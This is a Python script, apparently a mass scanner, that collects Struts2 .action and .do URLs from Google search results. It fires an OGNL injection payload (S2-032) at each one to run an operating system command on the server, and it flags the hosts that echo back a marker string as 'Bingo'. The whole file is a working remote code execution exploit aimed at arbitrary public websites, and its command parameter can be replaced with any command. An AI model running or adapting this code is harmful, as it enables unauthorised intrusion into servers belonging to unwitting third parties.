#coding=utf-8

import requests
import sys
import re
from google import search

url_action = re.compile(r'.*?\.action')
url_do = re.compile(r'.*?\.do')
url_replace = re.compile(r'!.*?\.action')

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}

def url_cut(url):
    matched = None
    if url_action.search(url):
        matched = url_action.search(url)
        if matched:
            replace = url_replace.search(matched.group())
            if replace:
                newurl=url_replace.sub('.action',matched.group())
                return newurl
            else:
                return matched.group()
    elif url_do.search(url):
        matched = url_do.search(url)
        return matched.group()
    else:
        return url

if len(sys.argv) == 2:
    keyw = sys.argv[1]
    try:
        for url in search(keyw,tld = 'hk',lang = 'zh',num =100):
            f_url = url_cut(url)
            pocstr = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=echo ohthatsgood&pp=\\A&ppp=%20&encoding=UTF-8"
            link = f_url + pocstr
            try:
                res = requests.get(link,headers = headers)
                if res.status_code == 200:
                    echostr = res.content
                    if echostr.strip() == 'ohthatsgood':
                        print "\033[1;33;43m"
                        print "[Bingo]: " + url
                        print "\33[0m"
                    else:
                        print url
                else:
                    print url
            except:
                print url
    except KeyboardInterrupt:
        print "\nBye!"
        sys.exit()

else:
    print "USG:\npython s2-032_Gsearch.py 'filetype:action .com'"
    print "USG:\npython s2-032_Gsearch.py 'filetype:do .com'"
    sys.exit()
